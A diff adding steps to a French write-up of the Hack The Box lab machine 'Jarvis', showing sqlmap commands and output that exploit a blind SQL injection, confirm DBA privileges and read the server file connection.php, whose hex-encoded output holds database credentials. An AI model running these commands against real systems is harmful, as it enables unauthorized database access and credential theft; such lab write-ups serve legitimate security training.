@@ -668,6 +668,46 @@ L’option `--batch` accepte automatiquement les réponses par défaut proposée
 
 Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil pour forcer une nouvelle détection.
 
+> **Remarque sur les échecs de `sqlmap`**
+>
+> Si une exécution de `sqlmap` déclenche le mécanisme de protection du site, les requêtes suivantes peuvent recevoir une réponse `404` pendant environ 90 secondes. Dans ce cas, tu dois attendre que la page retrouve son profil normal avant de relancer l’outil.
+>
+> Depuis un autre terminal, tu peux vérifier régulièrement l’état du site avec :
+>
+> ```bash
+> curl -s -o /dev/null \
+> -w 'code=%{http_code} length=%{size_download}\n' \
+> 'http://jarvis.htb/room.php?cod=2'
+> ```
+>
+> Tant que le bannissement est actif, la réponse ressemble à ceci :
+>
+> ```text
+> code=404 length=54
+> ```
+>
+> Tu peux reprendre les tests lorsque la page retourne de nouveau :
+>
+> ```text
+> code=200 length=6131
+> ```
+>
+> Cette vérification évite de relancer `sqlmap` trop tôt et de fausser sa détection avec les pages retournées par le mécanisme de protection.
+>
+> Si `sqlmap` continue malgré tout à réutiliser des résultats erronés ou incomplets, tu peux d’abord relancer la commande avec l’option `--flush-session`.
+>
+> Dans le pire des cas, tu peux supprimer uniquement les données enregistrées pour cette cible :
+>
+> ```bash
+> rm -rf ~/.local/share/sqlmap/output/jarvis.htb
+> ```
+>
+> Tu dois alors recommencer la détection de l’injection depuis une session propre.
+>
+> Cette suppression ciblée est préférable à l’effacement complet de `~/.local/share/sqlmap`, car elle ne concerne que la machine `jarvis.htb`. Attention toutefois : elle supprime également les fichiers déjà récupérés par `sqlmap` dans ce répertoire. Pense donc à les copier ailleurs si tu souhaites les conserver.
+>
+> Il faut parfois s’armer de beaucoup de patience et relancer `sqlmap` plusieurs fois avant d’obtenir une extraction complète et cohérente.
+
 Voici le résultat de cette exécution :
 
 ```bash
@@ -737,15 +777,221 @@ back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
 
 L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
 
-#### Identification du type d’injection et du SGBD
-
 ### Énumération de la base de données
 
 #### Identification de la base courante
 
+L’injection étant désormais confirmée, tu peux demander à `sqlmap` d’identifier la base de données actuellement utilisée par l’application.
+
+Tu relances l’outil avec l’option `--current-db` :
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --level=1 \
+  --risk=1 \
+  --threads=1 \
+  --delay=1 \
+  --batch \
+  --current-db
+```
+
+L’option `--current-db` demande à `sqlmap` de récupérer le nom de la base courante.
+
+Comme il s’agit d’une injection SQL de type **boolean-based blind**, la valeur recherchée n’est pas retournée directement dans la réponse du serveur. `sqlmap` doit la reconstruire caractère par caractère en envoyant successivement des conditions vraies ou fausses, puis en observant les différences dans les réponses HTTP.
+
+La récupération est donc relativement lente. La progression apparaît peu à peu dans la sortie :
+
+```
+[INFO] retrieved: h
+[INFO] retrieved: ho
+[INFO] retrieved: hot
+[INFO] retrieved: hote
+[INFO] retrieved: hotel
+```
+
+Chaque caractère nécessite plusieurs requêtes, ce qui explique pourquoi cette méthode est beaucoup plus lente qu’une injection SQL permettant de récupérer directement les données.
+
+À la fin de l’extraction, `sqlmap` affiche le résultat suivant :
+
+```
+current database: 'hotel'
+```
+
+La base de données actuellement utilisée par l’application est donc `hotel`.
+
 #### Énumération des tables de la base `hotel`
 
-#### Analyse des données accessibles
+Maintenant que tu connais le nom de la base courante, tu peux demander à `sqlmap` d’en énumérer les tables.
+
+Tu réutilises les mêmes paramètres afin de conserver une détection stable et de limiter le nombre de requêtes envoyées au serveur, puis tu ajoutes `-D hotel` et `--tables` :
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --level=1 \
+  --risk=1 \
+  --threads=1 \
+  --delay=1 \
+  --batch \
+  -D hotel \
+  --tables
+```
+
+L’option `-D hotel` indique à `sqlmap` de travailler sur la base `hotel`, tandis que `--tables` lui demande d’en récupérer la liste des tables.
+
+Comme précédemment, l’extraction repose sur une injection **boolean-based blind**. Le nom des tables est donc reconstruit progressivement, caractère par caractère, ce qui rend l’opération relativement lente.
+
+La sortie obtenue met en évidence une seule table :
+
+```
+Database: hotel
+[1 table]
++------+
+| room |
++------+
+```
+
+La base `hotel` contient donc uniquement la table `room`. 
+
+Le nom de cette table correspond directement au fonctionnement observé dans l’application : les pages `room.php` affichent les informations des chambres en fonction de la valeur transmise au paramètre `cod`. 
+
+Cette table semble donc surtout contenir les données utilisées pour alimenter les pages publiques du site. Il est peu probable qu’elle fournisse directement des informations sensibles comme des identifiants ou des mots de passe. 
+
+La prochaine étape consiste plutôt à identifier le compte MySQL utilisé par l’application, puis à examiner les privilèges dont il dispose.
+
+#### Identification de l’utilisateur MySQL
+
+Après avoir identifié la base courante et les tables qu’elle contient, tu peux maintenant déterminer quel compte MySQL est utilisé par l’application et vérifier s’il dispose de privilèges élevés. 
+
+Tu conserves les mêmes paramètres que précédemment et tu ajoutes l’option `--is-dba`. Lors de cette vérification, `sqlmap` affiche également l’identité de l’utilisateur MySQL courant.
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --string='Suite room is perfect' \
+  --level=1 \
+  --risk=1 \
+  --threads=1 \
+  --delay=1 \
+  --batch \
+  --flush-session \
+  --is-dba
+```
+
+L’option `--is-dba` demande à `sqlmap` de vérifier si le compte MySQL utilisé par l’application possède les privilèges DBA. Il n’est pas nécessaire de préciser le nom de cet utilisateur, car l’outil interroge directement le contexte de la session SQL vulnérable.
+
+Lors de cette vérification, `sqlmap` récupère également l’identité de l’utilisateur courant, ce qui permet d’obtenir les deux informations au cours de la même exécution.
+
+L’option `--string='Suite room is perfect'` fournit à `sqlmap` un marqueur caractéristique d’une réponse vraie. Cette chaîne avait été repérée lors de la détection précédente, puis vérifiée manuellement dans la page retournée pour `cod=2`. Elle permet de stabiliser la comparaison des réponses malgré le mécanisme de protection du site.
+
+L’extraction reste relativement lente, car l’injection est de type **boolean-based blind**. `sqlmap` doit reconstruire les informations caractère par caractère en envoyant plusieurs conditions vraies ou fausses.
+
+La sortie permet d’obtenir les deux résultats suivants :
+
+```
+current user: 'DBadmin@localhost'
+current user is DBA: True
+```
+
+Le compte MySQL utilisé par l’application est donc `DBadmin@localhost`. Le suffixe `@localhost` indique que ce compte se connecte localement au serveur de base de données.
+
+Son nom laissait déjà penser qu’il pouvait disposer de privilèges élevés, mais le résultat suivant en apporte cette fois la confirmation :
+
+```
+current user is DBA: True
+```
+
+Le compte utilisé par l’application possède donc les privilèges DBA `Data Base Administrtor`. 
+
+Cette situation ouvre des possibilités d’exploitation plus intéressantes que la simple lecture des données de la base.
+
+#### Lecture du fichier `connection.php`
+
+Les privilèges DBA du compte `DBadmin@localhost` peuvent offrir des possibilités qui dépassent l’énumération des données contenues dans MySQL. Tu peux notamment vérifier si ce compte permet de lire des fichiers locaux accessibles au serveur de base de données.
+
+L’application étant développée en PHP et connectée à MySQL, ses fichiers de configuration constituent une cible intéressante. Ils peuvent contenir les paramètres utilisés pour établir la connexion à la base de données.
+
+La prochaine étape consiste donc à tenter de récupérer le fichier `connection.php`.
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --threads=1 \
+  --delay=1 \
+  --timeout=20 \
+  --retries=5 \
+  --disable-precon \
+  --batch \
+  --file-read=/var/www/html/connection.php
+```
+
+
+
+```bash
+         ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:04:27 /2026-07-13/
+
+[16:04:27] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i3cq22355be...m0gqu6r233'). Do you want to use those [Y/n] Y
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 2849=2849
+---
+
+[16:04:28] [INFO] testing MySQL
+[16:04:28] [INFO] confirming MySQL
+[16:04:28] [INFO] the back-end DBMS is MySQL
+
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0
+
+[16:04:28] [INFO] fingerprinting the back-end DBMS operating system
+[16:04:28] [INFO] the back-end DBMS operating system is Linux
+[16:04:28] [INFO] fetching file: '/var/www/html/connection.php'
+[16:04:28] [INFO] resuming partial value: 3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C6928273132372E302
+[16:04:28] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[16:04:28] [INFO] retrieved: E302E31272C27444261646D696E272C27696D697373796F75272C27686F74656C27293B0A3F3E0A
+
+do you want confirmation that the remote file '/var/www/html/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
+
+[16:11:24] [INFO] retrieved: 75
+[16:11:38] [INFO] the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)
+
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php (same file)
+
+[16:11:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 16:11:38 /2026-07-13/
+```
+
+
 
 ### Exploitation de l’injection SQL pour obtenir une exécution de commandes
 
